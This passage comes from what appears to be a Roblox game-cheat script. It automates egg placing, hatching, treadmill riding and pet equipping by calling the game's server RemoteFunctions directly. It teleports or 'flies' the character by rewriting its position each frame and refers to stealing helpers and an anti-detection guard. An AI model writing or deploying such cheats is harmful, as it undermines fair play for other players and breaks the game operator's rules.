					if ok and type(result) == "table" then
						for _, v23 in pairs(result) do
							if type(v23) == "table" and v23.Placement ~= nil then
								n24 += 1
							end
						end
					end
				end

				local save2 = tbl.Save
				local flag5 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				local flag6 = result and type(result.EquippedAssets) == "table"
				local n25 = 0

				if flag6 then
					for k in pairs(result.EquippedAssets) do
						n25 += 1
					end
				end

				local v23 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

				local flag7 = type(v23) == "table" and type(v23.GetAssetEquipCapacity) == "function"
				local ok = nil

				if flag7 then
					local result2
					ok, result2 = pcall(v23.GetAssetEquipCapacity, result and tonumber(result.BaseUpgradeLevel) or 0)
					ok = ok and tonumber(result2) or nil
				end

				if not ok then
					local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

					if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
						local result2
						ok, result2 = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
						ok = ok and tonumber(result2) or nil
					end
				end

				ok = ok or 0
				return ok - n24 - n25, ok, n24, n25
			end

			local n24 = -0.5
			local n25 = -24

			local function fn41()
				local eggState = tbl.EggState
				local tbl24 = {}
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl24
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl24
				end

				for _, v23 in pairs(result) do
					local placement = type(v23) == "table" and v23.Placement or nil
					local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil

					if typeof(localCFrame) == "CFrame" then
						table.insert(tbl24, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
					end
				end

				return tbl24
			end

			local v23 = Random.new()

			local function fn42(arg)
				local tbl24 = {}

				for i = n25, 8, 4 do
					for i2 = 4, 30, 4 do
						local vector2 = Vector2.new(i, i2)
						local flag4 = true

						for _, v24 in ipairs(arg) do
							if (v24 - vector2).Magnitude < n15 then
								flag4 = false
								break
							end
						end

						if flag4 then
							table.insert(tbl24, CFrame.new(i, n24, i2))
						end
					end
				end

				for i = #tbl24, 2, -1 do
					local v24 = v23:NextInteger(1, i)
					local v25 = tbl24[i]
					tbl24[i] = tbl24[v24]
					tbl24[v24] = v25
				end

				return tbl24
			end

			local function fn43()
				local v24, v25, v26, v27 = fn40()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n26 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v28 in pairs(result) do
							if type(v28) == "table" and v28.Placement == nil then
								n26 += 1
							end
						end
					end
				end

				str3 = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", v26, 30, v27, v25, n26)
				return v24, v26
			end

			local function fn44(arg, arg2)
				local v24 = tbl4.Root()
				if not v24 then
					return false
				end
				local position = v24.Position
				local n26 = (arg - position).Magnitude / math.max(n2, 1) + 3
				local flag4 = nil
				local n27 = 0

				local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
					if flag4 ~= nil or tbl4.AntiGuard.Busy then
						return
					end
					n27 += deltaTime
					local v25 = tbl4.Root()
					if not v25 or arg2() or n27 > n26 then
						flag4 = false
						return
					end

					if (v25.Position - position).Magnitude > 6 then
						position = v25.Position
					end

					local n28 = arg - position
					local n29 = n2 * deltaTime
					local flag5 = n28.Magnitude <= math.max(n29, 0.05)
					position = flag5 and arg or position + n28.Unit * n29
					local vector = Vector3.new(n28.X, 0, n28.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v25.CFrame.Rotation

					pcall(function()
						v25.CFrame = CFrame.new(position) * cframe
						v25.AssemblyLinearVelocity = Vector3.zero
						v25.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag5 then
						flag4 = true
					end
				end)

				while flag4 == nil do
					RunService.Heartbeat:Wait()
				end

				connection2:Disconnect()
				return flag4
			end

			local function fn45()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				return world and world:IsA("BasePart") and world.Position.X or 552
			end

			local fn46 = nil

			local function fn47(arg)
				local v24 = tbl4.Root()
				if not v24 or type(tbl4.StealHome) ~= "function" then
					return nil
				end
				local v25 = fn45()
				if v24.Position.X < v25 == arg.X < v25 then
					return nil
				end
				local ok, result = pcall(tbl4.StealHome)
				if not ok or typeof(result) ~= "Vector3" then
					return nil
				end

				if (result - arg).Magnitude <= 12 or (v24.Position - result).Magnitude <= 12 then
					return nil
				end
				return result
			end

			fn46 = function(arg, arg2, arg3, arg4)
				local v24 = tbl4.Root()
				if not v24 then
					return false
				end

				if not arg4 then
					local v25 = fn47(arg)
					if v25 and not fn46(v25, arg2, arg3, true) then
						return false
					end

					if arg2 and arg2() then
						return false
					end
					v24 = tbl4.Root()
					if not v24 then
						return false
					end
				end

				tbl4.Shield(arg3 or "place", true)
				tbl4.Driving = tbl4.Driving + 1
				task.wait(0.2)
				local n26 = arg + Vector3.new(0, 3, 0)
				local n27 = math.max(v24.Position.Y, n26.Y) + n23

				local ok, result = pcall(function()
					return fn44(Vector3.new(v24.Position.X, n27, v24.Position.Z), arg2) and fn44(Vector3.new(n26.X, n27, n26.Z), arg2) and fn44(n26, arg2)
				end)

				ok = ok and result == true
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				tbl4.Shield(arg3 or "place", false)
				return ok
			end

			tbl4.FlyTo = function(arg, arg2, arg3)
				return fn46(arg, arg2, arg3 or "fly")
			end

			local function fn48()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
					return false
				end
				local v24 = fn38()
				if not fn39(#v24) then
					return false
				end
				fn43()
				local v25, v26, v27 = fn40()
				local n26 = n20 - (tonumber(v27) or 0)
				if n26 <= 0 then
					return false
				end
				local v28 = tbl4.PenAnchor()
				if not v28 then
					return false
				end
				tbl4.Movement.PlaceWanted = true
				if not tbl4.ClaimMovement("place") then
					return "waiting"
				end
				local v29 = n22

				local function fn49()
					if v29 ~= n22 or not tbl4.Toggle(placeEggHandle, false) then
						return true
					end

					if tbl4.IsNight() then
						return false
					end
					return v20 == tbl19[4] or tbl4.Movement.StealFirst
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				local function fn50()
					tbl4.HoldBelt()
					local ok, result = pcall(fn46, v28, fn49)
					tbl4.ReleaseBelt()
					return ok and result and true or false
				end

				if n16 < tbl4.DistanceTo(v28) then
					str3 = "Flying to the pen"

					if not fn50() then
						tbl4.LeaveBelt()
						n19 = os.clock() + n17
						return false
					end
				end

				tbl4.LeaveBelt()
				if fn49() then
					return false
				end

				local function fn51()
					if tbl4.DistanceTo(v28) <= n16 then
						return true
					end

					if fn49() then
						return false
					end
					str3 = "Pen out of reach, flying back"
					return fn50() and tbl4.DistanceTo(v28) <= n16
				end

				if not fn51() then
					str3 = "Could not reach the pen, trying again soon"
					n19 = os.clock() + n17
					return false
				end

				local v30 = fn41()
				local n27 = 0
				local n28 = 0

				for _, v31 in ipairs(v24) do
					if not (n27 >= n26 or fn49()) then
						if not fn51() then
							str3 = "Pen out of reach, stopping this pass"
							break
						else
							local ok, result = pcall(eggState.WearEggTool, v31.Uid)

							if ok and result ~= false then
								task.wait(0.15)
								local n29 = 0
								local flag4 = false

								for _, v32 in ipairs(fn42(v30)) do
									if not (fn49() or n29 >= n18) then
										n29 += 1
										local AskPlaceEgg, v33 = fn33("RF/EggWorld/AskPlaceEgg", { Uid = v31.Uid, LocalCFrame = v32 })

										if AskPlaceEgg and v33 ~= false then
											table.insert(v30, Vector2.new(v32.Position.X, v32.Position.Z))
											n27 += 1
											flag4 = true
											break
										else
											continue
										end
									end

									break
								end

								if flag4 then
									n28 = 0
									continue
								else
									tbl23[v31.Uid] = true
									n28 += 1
									if not (n28 >= 2) then
										continue
									end
								end
							else
								tbl23[v31.Uid] = true
								continue
							end
						end
					end

					break
				end

				if type(eggState.DoffEggTool) == "function" then
					pcall(eggState.DoffEggTool)
				end

				if n27 == 0 then
					n19 = os.clock() + n17
				end

				return n27 > 0
			end

			tbl3.Add(function()
				local v24, v25 = fn43()

				if placeEggStatusRow and type(placeEggStatusRow.Set) == "function" then
					pcall(placeEggStatusRow.Set, placeEggStatusRow, str3)
				end

				local num = tonumber(v25)
				local flag4 = num ~= nil and v22 ~= nil and num < v22

				if num then
					v22 = num
				end

				if flag4 then
					table.clear(tbl23)
				end

				if not tbl4.Toggle(placeEggHandle, false) then
					tbl4.Movement.PlaceWanted = false
					tbl4.ReleaseMovement("place")
					return false
				end

				if flag3 then
					return false
				end

				if os.clock() < n19 then
					tbl4.Movement.PlaceWanted = false
					return false
				end

				if tbl4.Movement.StealFirst and not tbl4.IsNight() then
					tbl4.Movement.PlaceWanted = false
					return false
				end
				flag3 = true

				task.spawn(function()
					local ok, result = pcall(fn48)

					if not (ok and result == "waiting") then
						tbl4.Movement.PlaceWanted = false
					end

					tbl4.ReleaseMovement("place")
					flag3 = false
					tbl3.Wake()
				end)

				return false
			end)

			placeEggHandle = tbl4.PlaceEggHandle
			placeEggStatusRow = tbl4.PlaceEggStatusRow

			tbl4.PlaceEggRestart = function()
				table.clear(tbl23)
				n22 += 1
				tbl4.StopWalking()
				tbl3.Wake()
			end

			tbl4.PlaceEggRefresh = function()
				table.clear(tbl23)
				tbl3.Wake()
			end

			tbl4.Rift.Restart.Place = function()
				table.clear(tbl23)
				tbl3.Wake()
			end
		end

		local save2 = tbl.Save

		if type(save2) == "table" and type(save2.FieldSignal) == "function" then
			for _, v22 in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
				local ok, result = pcall(save2.FieldSignal, v22)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		do
			local eggState = tbl.EggState
			local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

			if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
				local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
					local carrying = type(arg) == "table" and arg.IsCarrying == true

					if tbl4.Steal.Carrying and not carrying then
						tbl4.Steal.LastFinishedAt = os.clock()
					end

					if carrying and type(arg.Uid) == "string" then
						tbl4.Steal.CarryUid = arg.Uid
						tbl4.Steal.CarryAreaId = arg.AreaId
					end

					tbl4.Steal.Carrying = carrying
					tbl3.Wake()
				end)

				if ok and result then
					fn4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		do
			local n15 = 10
			local n16 = 1
			local n17 = 5

			local function fn33(arg)
				local v22 = networking:FindFirstChild(arg)
				if not v22 or not v22:IsA("RemoteFunction") then
					return false, nil, nil
				end
				local ok, result, result2 = pcall(v22.InvokeServer, v22)
				return ok, result, result2
			end

			local n18 = 0
			local flag3 = false

			local function fn34(arg, arg2, arg3)
				if arg and arg2 ~= false then
					n18 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Already using treadmill" then
					n18 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Not grounded" and tbl4.Grounded() then
					n18 += 1

					if n18 >= 2 then
						n18 = 0

						if not flag3 then
							flag3 = true
							pcall(tbl4.UndoSwap)
						elseif type(tbl4.RequestRespawn) == "function" then
							flag3 = false
							tbl4.RequestRespawn()
						end
					end
				end

				return false
			end

			local v22 = nil
			local v23 = nil
			local flag4 = false
			local n19 = 0
			local flag5 = false
			local treadmill = tbl4.Treadmill

			local function fn35()
				return tbl4.Toggle(v22, false)
			end

			local function fn36()
				local movement = tbl4.Movement
				return movement.PlaceWanted or movement.ScrambleWanted or movement.MutationWanted or movement.FracturedWanted or movement.Owner ~= nil and movement.Owner ~= "treadmill" or tbl4.Steal.Active or tbl4.Steal.Carrying
			end

			local function fn37()
				local v24 = n19
				if fn36() or not tbl4.ClaimMovement("treadmill") then
					return false
				end

				local function fn38()
					return v24 ~= n19 or not fn35() or tbl4.Movement.Owner ~= "treadmill" or fn36()
				end

				if tbl4.BeltHeld() then
					tbl4.ResetBelt()
				end

				local v25 = tbl4.Belt()
				if not v25 then
					return false
				end
				local n20 = v25.Position + Vector3.new(0, v25.Size.Y / 2, 0)

				if n15 < tbl4.DistanceTo(n20 + Vector3.new(0, 2, 0)) then
					if type(tbl4.FlyTo) ~= "function" or not tbl4.FlyTo(n20, fn38, "treadmill") then
						return false
					end
				end

				if fn38() then
					return false
				end
				treadmill.Riding = fn34(fn33("RF/Treadmill/AskWearStill"))
				return treadmill.Riding
			end

			tbl3.Add(function()
				if not fn35() then
					if treadmill.Riding and not flag4 then
						flag4 = true

						task.spawn(function()
							pcall(tbl4.ExitBelt)
							flag4 = false
							tbl3.Wake()
						end)
					end

					return false
				end

				if flag4 or fn36() then
					return false
				end

				if treadmill.Riding and tbl4.Toggle(v23, true) and tbl4.OnBelt() then
					if os.clock() >= (treadmill.NextCheck or 0) and not tbl4.Flying and tbl4.Grounded() then
						treadmill.NextCheck = os.clock() + n17
						flag4 = true

						task.spawn(function()
							local ok, result = pcall(function()
								return fn34(fn33("RF/Treadmill/AskWearStill"))
							end)

							treadmill.Riding = ok and result == true

							if not treadmill.Riding then
								treadmill.NextTry = 0
							end

							flag4 = false
							tbl3.Wake()
						end)
					end

					return false
				end

				if os.clock() < (treadmill.NextTry or 0) then
					return false
				end
				treadmill.NextCheck = 0
				treadmill.NextTry = os.clock() + (treadmill.LastFailed and 3 or 4)
				flag4 = true

				task.spawn(function()
					local ok, result = pcall(fn37)
					treadmill.LastFailed = not (ok and result == true)
					tbl4.ReleaseMovement("treadmill")
					flag4 = false
					tbl3.Wake()
				end)

				return false
			end)

			task.spawn(function()
				while not flag5 do
					task.wait(3)

					if not fn35() and not fn36() and not tbl4.Flying and tbl4.OnBelt() and tbl4.Grounded() then
						fn34(fn33("RF/Treadmill/AskWearStill"))
					end
				end
			end)

			task.spawn(function()
				local n20 = 0

				while not flag5 do
					local v24 = task.wait(0.25)

					if not fn35() or not treadmill.Riding or fn36() then
						n20 = 0
					elseif tbl4.OnBelt() then
						n20 = 0
					else
						n20 += v24

						if n20 >= 1.5 then
							treadmill.Riding = false
							treadmill.NextTry = 0
							tbl3.Wake()
							n20 = 0
						end
					end
				end
			end)

			task.spawn(function()
				local n20 = 0
				local n21 = 0
				local position = nil

				while not flag5 do
					local v24 = task.wait(0.25)
					n20 = math.max(0, n20 - v24)
					local flag6 = treadmill.Riding and fn35() and not fn36()
					local v25 = tbl4.Root()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if flag6 or not (tbl4.Flying or tbl4.Movement.Owner ~= nil or tbl4.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not v25 or not tbl4.OnBelt() then
						position = v25 and v25.Position
						n21 = 0
						position = position or nil
					else
						local vector = Vector3.new(v25.Position.X, 0, v25.Position.Z)
						position = position and (vector - Vector3.new(position.X, 0, position.Z)).Magnitude < 0.5

						if position then
							n21 += v24
						else
							n21 = 0
						end

						position = v25.Position

						if n21 >= n16 and n20 <= 0 then
							pcall(tbl4.ExitBelt)
							n20 = 1.5
							n21 = 0
						end
					end
				end
			end)

			fn4(function()
				flag5 = true
				treadmill.Riding = false
			end)

			v22 = v10:CreateToggle({
				Name = "Auto Treadmill",
				Default = false,
				Callback = function()
					n19 += 1
					tbl4.StopWalking()
					tbl3.Wake()
				end,
			})

			v23 = v10:CreateToggle({ Name = "Stay On Treadmill", Default = true })
		end

		do
			local n15 = 4
			local n16 = 10
			local v22 = nil
			local flag3 = false
			local n17 = 0
			local tbl23 = {}
			local tbl24 = { MinRarity = 0, MinIncome = 0, Eggs = {} }

			local function fn33(arg, arg2)
				local v23 = networking:FindFirstChild(arg)
				if not v23 or not v23:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v23.InvokeServer, v23, arg2)
			end

			local function fn34(arg)
				local flag4 = tbl24.MinRarity > 0
				local flag5

				if flag4 then
					local minRarity = tbl24.MinRarity
					flag5 = tbl4.EggRarity(arg) < minRarity
				else
					flag5 = flag4
				end

				if flag5 then
					return false
				end
				local flag6 = tbl24.MinIncome > 0

				if flag6 then
					local minIncome = tbl24.MinIncome
					flag6 = tbl4.EggIncome(arg) < minIncome
				end

				if flag6 then
					return false
				end

				if next(tbl24.Eggs) ~= nil and tbl24.Eggs[tostring(arg.AssetCategory)] ~= true then
					return false
				end
				return true
			end

			local function fn35()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local flag4 = tbl4.Toggle(v22, false) == true
				local Hatch = tbl4.RiftOn("Hatch") and tbl4.RiftShortfall() or {}
				local tbl25 = {}
				local tbl26 = {}

				for k, v23 in pairs(result) do
					local flag5 = type(v23) == "table" and v23.Placement ~= nil

					if flag5 then
						flag5 = (tbl23[k] or 0) <= os.clock()
					end

					if flag5 then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 == true then
							local str3 = tostring(v23.AssetCategory)

							if (Hatch[str3] or 0) > 0 then
								Hatch[str3] = Hatch[str3] - 1
								table.insert(tbl25, k)
							elseif flag4 and fn34(v23) then
								table.insert(tbl26, k)
							end
						end
					end
				end

				for _, v23 in ipairs(tbl26) do
					table.insert(tbl25, v23)
				end

				return tbl25
			end

			local function fn36()
				return tbl4.Toggle(v22, false) or tbl4.RiftOn("Hatch")
			end

			local function fn37()
				local v23 = n17
				local v24 = fn35()
				local n18 = 0

				for _, v25 in ipairs(v24) do
					if not (n18 >= n15 or v23 ~= n17 or not fn36()) then
						local AskHatch, v26 = fn33("RF/EggWorld/AskHatch", v25)

						if AskHatch and v26 ~= false then
							task.wait(0.35)
							fn33("RF/EggWorld/AskFinishHatch", v25)
							n18 += 1
							tbl23[v25] = nil
						else
							tbl23[v25] = os.clock() + n16
						end

						task.wait(0.2)
						continue
					end

					break
				end

				return n18 > 0
			end

			tbl3.Add(function()
				if not fn36() or flag3 then
					return false
				end
				flag3 = true

				task.spawn(function()
					pcall(fn37)
					flag3 = false
				end)

				return false
			end)

			local function hatch()
				n17 += 1
				table.clear(tbl23)
				tbl3.Wake()
			end

			v22 = v11:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = hatch })

			v11:CreateDropdown({
				Name = "Hatch Min Rarity",
				Note = "Hatch eggs of the chosen rarity and every rarity above it",
				Options = tbl7,
				Default = tbl7[1],
				SubOf = v22,
				Callback = function(arg)
					tbl24.MinRarity = tbl8[arg] or 0
					hatch()
				end,
			})

			local tbl25 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local tbl26 = { Slider = nil, Value = 0, Unit = "M/s" }

			local function fn38(arg, arg2)
				if arg ~= nil then
					tbl26.Value = math.max(0, math.floor(tonumber(arg) or tbl26.Value))
				end

				if arg2 ~= nil then
					tbl26.Unit = tostring(arg2)
				end

				tbl24.MinIncome = tbl26.Value * (tbl25[tbl26.Unit] or tbl25["M/s"]).Mult
				hatch()
			end

			tbl26.Slider = fn5(v11, {
				Name = "Min Hatch Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = v22,
				Legacy = "Hatch Min Value",
				SectionName = "Auto Hatch & Equip",
				OnRaw = function(arg)
					fn38(math.floor(arg / 1000), "K/s")
				end,
			})

			local tbl27 = {}
			local tbl28 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local n18 = 0

			while (type(directory) ~= "table" or next(directory) == nil) and n18 < 2 do
				n18 += task.wait(0.1)

				if type(tbl.Assets) ~= "table" then
					tbl.Assets = fn2(function()
						return ReplicatedStorage.Data.Assets
					end)
				end

				directory = tbl.Assets and tbl.Assets.Directory
			end

			local tbl29 = {}

			if type(directory) == "table" then
				for k, v23 in pairs(directory) do
					local rarity = type(v23) == "table" and v23.Rarity or nil
					local rarity2 = type(rarity) == "table"

					if rarity2 then
						rarity2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					rarity2 = rarity2 or nil

					if rarity2 then
						local insert = table.insert
						local tbl30 = { Category = tostring(k) }
						local v24 = tostring
						k = v23.DisplayName or k
						tbl30.Name = v24(k)
						tbl30.Rarity = rarity2
						tbl30.RarityName = tostring(rarity.DisplayName or rarity._id or rarity2)
						insert(tbl29, tbl30)
					end
				end
			end

			table.sort(tbl29, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v23 in ipairs(tbl29) do
				local str3 = string.format("%s [%s]", v23.Name, v23.RarityName)

				if tbl28[str3] then
					str3 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
				end

				table.insert(tbl27, str3)
				tbl28[str3] = v23.Category
			end

			if #tbl27 > 0 then
				fn6(v11:CreateMultiDropdown({
					Name = "Hatch Specific Eggs",
					Note = "Only hatch these eggs (empty = all)",
					Options = tbl27,
					Default = {},
					SubOf = v22,
					Callback = function(arg)
						local eggs = {}

						if type(arg) == "table" then
							for k, v23 in pairs(arg) do
								k = v23 == true and type(k) == "string" and k or type(v23) == "string" and v23
								local v24 = k or nil

								if v24 and tbl28[v24] then
									eggs[tbl28[v24]] = true
								end
							end
						end

						tbl24.Eggs = eggs
						hatch()
					end,
				}))
			end

			tbl4.Rift.Restart.Hatch = hatch
		end

		do
			local n15 = 5
			local n16 = 30
			local v22 = nil
			local flag3 = false
			local n17 = 0
			local tbl23 = {}
			local n18 = 0
			local flag4 = true
			local v23 = nil
			local n19 = -math.huge

			local function fn33(arg)
				local v24 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

				if type(v24) == "table" and type(v24.GetAssetEquipCapacity) == "function" then
					local ok, result = pcall(v24.GetAssetEquipCapacity, arg and tonumber(arg.BaseUpgradeLevel) or 0)
					if ok and tonumber(result) then
						return math.floor(tonumber(result))
					end
				end

				if v23 and os.clock() - n19 < n16 then
					return v23
				end
				local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

				if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
					local ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)

					if ok and tonumber(result) then
						local n20 = math.floor(tonumber(result))
						local now = os.clock()
						v23 = n20
						n19 = now
						return v23
					end
				end

				return v23 or 0
			end

			local function fn34(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag5 = type(directory) == "table" and directory[tostring(arg.Category)] or nil
				local n20 = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
				local n21 = tonumber(arg.Scale) or 0
				if n20 <= 0 or n21 <= 0 then
					return 0
				end
				local n22 = n21 > 5 and (n21 / 5) ^ 1.2 * 19.637875755794113 or n21 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n23 = 1

				if flag6 then
					local ok
					ok, n23 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n23) == "number"
					local n24 = 1

					if not ok then
						n23 = n24
					end
				end

				return n20 * n22 * n23
			end

			local function fn35()
				local save3 = tbl.Save
				local flag5 = type(save3) == "table" and type(save3.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save3.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return nil
				end
				local tbl24 = {}
				local tbl25 = {}
				local v24 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v24(equippedAssets) do
					if type(equippedAsset) == "string" then
						tbl24[equippedAsset] = true
						table.insert(tbl25, equippedAsset)
					end
				end

				local tbl26 = {}
				local v25 = pairs
				local inventory = result.Inventory or {}

				for k, v26 in v25(inventory) do
					if type(v26) == "table" and v26.InFuse ~= true then
						table.insert(tbl26, { Uid = k, Income = fn34(v26), Equipped = tbl24[k] == true })
					end
				end

				table.sort(tbl26, function(arg, arg2)
					if arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end
					return tostring(arg.Uid) < tostring(arg2.Uid)
				end)

				return tbl26, tbl24, #tbl25, result
			end

			local function fn36(arg, arg2)
				local tbl24 = {}
				local flag5 = false

				for i, v24 in ipairs(arg) do
					if not (i > arg2) then
						if not v24.Equipped then
							table.insert(tbl24, v24.Uid)

							if not tbl23[v24.Uid] then
								flag5 = true
							end
						end

						continue
					end

					break
				end

				return tbl24, flag5
			end

			tbl3.Add(function()
				if not tbl4.Toggle(v22, false) then
					return false
				end
				local v24, v25, v26, v27 = fn35()

				if v24 then
					local v28 = fn33(v27)
					local v29, v30 = fn36(v24, v28)

					if (v30 or flag4) and not flag3 and os.clock() >= n18 then
						for _, v31 in ipairs(v29) do
							tbl23[v31] = true
						end

						flag4 = false
						flag3 = true
						n18 = os.clock() + n15
						local v31 = n17

						task.spawn(function()
							local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
							local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
							local flag5 = true

							if isRemoteFunction then
								local ok, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
								flag5 = ok and result ~= false and result ~= nil
							end

							local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")

							if flag5 and v31 == n17 and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
								pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
							end

							flag3 = false
							tbl3.Wake()
						end)
					end
				end

				return false
			end)

			v22 = v11:CreateToggle({
				Name = "Auto Equip Best",
				Note = "Equip Best when a better pet appears",
				Default = false,
				Callback = function()
					n17 += 1
					table.clear(tbl23)
					n18 = 0
					flag4 = true
					tbl3.Wake()
				end,
			})

			local save3 = tbl.Save

			if type(save3) == "table" and type(save3.FieldSignal) == "function" then
				for _, v24 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save3.FieldSignal, v24)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							flag4 = true
							tbl3.Wake()
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		local n15
		n15 = 3
		local tbl23, tbl24, tbl25, tbl26, tbl27, v22

		do
			local n16 = 50
			tbl23 = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }

			local v23 = fn2(function()
				return ReplicatedStorage.Shared.Util.AssetItems
			end)

			tbl24 = {}
			tbl25 = {}
			tbl26 = {}
			tbl27 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl28 = {}
			local tbl29 = {}

			if type(directory) == "table" then
				for k, v24 in pairs(directory) do
					local rarity = type(v24) == "table" and v24.Rarity or nil
					local flag3 = type(rarity) == "table"
					local num

					if flag3 then
						num = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						num = flag3
					end

					num = num or nil

					if num then
						local str3 = tostring(rarity.DisplayName or rarity._id or num)
						tbl28[num] = tbl28[num] or str3

						table.insert(tbl29, {
							Category = tostring(k),
							Name = tostring(v24.DisplayName or k),
							Rarity = num,
							RarityName = str3,
						})
					end
				end
			end

			local tbl30 = {}

			for k in pairs(tbl28) do
				table.insert(tbl30, k)
			end

			table.sort(tbl30)

			for _, v24 in ipairs(tbl30) do
				local str3 = string.format("%d - %s", v24, tbl28[v24])
				table.insert(tbl24, str3)
				tbl25[str3] = v24
			end

			table.sort(tbl29, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v24 in ipairs(tbl29) do
				local str3 = string.format("%s [%s]", v24.Name, v24.RarityName)

				if tbl27[str3] then
					str3 = string.format("%s [%s] (%s)", v24.Name, v24.RarityName, v24.Category)
				end

				table.insert(tbl26, str3)
				tbl27[str3] = v24.Category
			end

			local function fn33(arg)
				for _, v24 in ipairs(tbl24) do
					if tbl25[v24] == arg then
						return v24
					end
				end

				return tbl24[1]
			end

			local v24 = nil
			v22 = nil
			local v25 = nil
			local v26 = nil
			local v27 = tbl23[1]
			local n17 = 3
			local n18 = 0
			local flag3 = true
			local tbl31 = {}
			local v28 = tbl23[1]
			local n19 = 3
			local n20 = 0
			local flag4 = true
			local tbl32 = {}
			local flag5 = false
			local n21 = 0

			local function fn34(arg)
				local n22 = tonumber(arg) or 0
				local tbl33 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n23 = 1

				while math.abs(n22) >= 1000 and n23 < #tbl33 do
					n22 /= 1000
					n23 += 1
				end

				return string.format(n23 == 1 and "$%.0f%s" or "$%.2f%s", n22, tbl33[n23])
			end

			local function fn35(arg, arg2)
				local tbl33 = {}

				if type(arg) == "table" then
					for k, v29 in pairs(arg) do
						k = v29 == true and type(k) == "string" and k

						if k then
							v29 = k
						else
